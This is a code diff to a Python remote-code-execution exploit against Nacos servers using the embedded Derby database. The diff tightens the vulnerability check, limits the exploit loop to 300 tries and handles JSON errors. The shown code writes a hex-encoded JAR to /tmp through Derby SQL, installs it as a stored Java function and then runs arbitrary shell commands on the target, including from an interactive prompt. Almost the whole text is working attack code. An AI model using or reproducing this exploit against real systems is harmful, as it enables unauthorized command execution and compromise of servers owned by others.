@@ -21,8 +21,9 @@ class NacosRCE:
         return ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',8))
     
     def check_vul(self):
-        req = requests.get(url=self.derby_url,headers=self.headers)
-        if "caused: Required request parameter" in req.text and req.status_code == 500:
+        derby_req = requests.get(url=self.derby_url,headers=self.headers)
+        removal_req = requests.get(url=self.removal_url,headers=self.headers)
+        if ("caused: Required" in derby_req.text and derby_req.status_code == 500) and ("caused: Request" in removal_req.text and removal_req.status_code == 500) :
             return True
         else:
             return False
@@ -33,6 +34,8 @@ class NacosRCE:
         if req.status_code == 200:
             if 'startup_mode' not in data_json.keys():
                 data_json['startup_mode'] = data_json.get("standalone_mode")
+            if 'auth_enabled' not in data_json.keys():
+                data_json['auth_enabled'] = "Unknown"
             return [data_json.get("version"),data_json.get("auth_enabled"),data_json["startup_mode"]]
 
     def base_info(self):
@@ -41,25 +44,29 @@ class NacosRCE:
 
     def javahex_exploit(self,option):
         for i in range(0,sys.maxsize):
+            if i >= 300:
+                print("[-] The vulnerability failed to be exploited. Please try to exploit it manually")
+                sys.exit(1)
             self.id = self.getRandomId()
             self.option = option
             self.jar_filename = "/tmp/tmp" + self.id + ".jar"
             self.external_name = self.getExternalName(self.option)
             javahex = self.getJavaHex(self.option)
-
             post_sql = """
             CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''{a1}'' as blob)', '{a2}', ',', '\"', 'UTF-8', '{a3}')
             CALL sqlj.install_jar('{a4}', 'NACOS.{a5}', 0)
             CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.{a6}')
             CREATE FUNCTION S_EXAMPLE_{a7}(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME '{a8}'""".format(a1=javahex,a2=self.jar_filename,a3=self.jar_filename,a4=self.jar_filename,a5=self.id,a6=self.id,a7=self.id,a8=self.external_name)
-
             data = {'file':post_sql}
             req = requests.post(url=self.removal_url,files=data,headers=self.headers)
-            data_json = req.json()
-            if data_json.get('message',None) is None and data_json.get('data',None) is not None:
-                print("[+] Execution successful, Vulnerability exists! Function Name: S_EXAMPLE_" + self.id)
-                break
-        
+            try:
+                data_json = req.json()
+                if data_json.get('message',None) is None and data_json.get('data',None) is not None:
+                    print("[+] Execution successful, Vulnerability exists! Function Name: S_EXAMPLE_" + self.id)
+                    break
+            except requests.exceptions.JSONDecodeError as e:
+                pass
+            
         if self.option not in ('1','2'):
             while True:
                 cmd = input("Please enter the command you wish to execute (type 'exit' to quit): ")
@@ -71,7 +78,6 @@ class NacosRCE:
 
     def execute_cmd(self,command):
         get_sql = """select * from (select count(*) as b, S_EXAMPLE_{id}('{cmd}') as a from config_info) tmp /*ROWS FETCH NEXT*/""".format(id=self.id,cmd=command)
-
         req = requests.get(url=self.derby_url + "?sql=" + get_sql,headers=self.headers)
         data_json = req.json()
         if req.status_code == 200:
